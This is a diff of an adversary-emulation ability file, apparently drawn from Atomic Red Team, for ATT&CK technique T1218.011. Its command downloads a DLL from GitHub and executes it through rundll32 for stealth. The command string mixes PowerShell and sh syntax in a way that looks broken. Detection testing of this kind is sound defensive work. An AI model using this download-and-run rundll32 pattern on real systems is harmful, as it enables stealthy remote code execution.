@@ -5,23 +5,23 @@
   tactic: stealth
   technique:
     attack_id: T1218.011
-    name: 'Signed Binary Proxy Execution: Rundll32'
+    name: 'System Binary Proxy Execution: Rundll32'
   platforms:
     windows:
       sh:
         command: 'if (Test-Path "PathToAtomicsFolder\T1047\bin\calc.dll") {exit 0}
           else {exit 1}; then : ; else Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
-          -OutFile "PathToAtomicsFolder\T1047\bin\calc.dll"; fi; rundll32.exe shell32.dll,Control_RunDLL
-          "PathToAtomicsFolder\T1047\bin\calc.dll"'
+          -OutFile "PathToAtomicsFolder\T1047\bin\calc.dll" -UseBasicParsing; fi;
+          rundll32.exe shell32.dll,Control_RunDLL "PathToAtomicsFolder\T1047\bin\calc.dll"'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - t1218.011
   - stealth
+  - t1218.011
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -41,8 +41,9 @@
 
         '
       get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+        -UseBasicParsing
 
         '
     technique_created: '2020-01-23T18:03:46.248Z'
     atomic_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
-    import_timestamp: '2026-10-20T07:08:26.309198Z'
+    import_timestamp: '2026-10-21T07:01:49.118285Z'
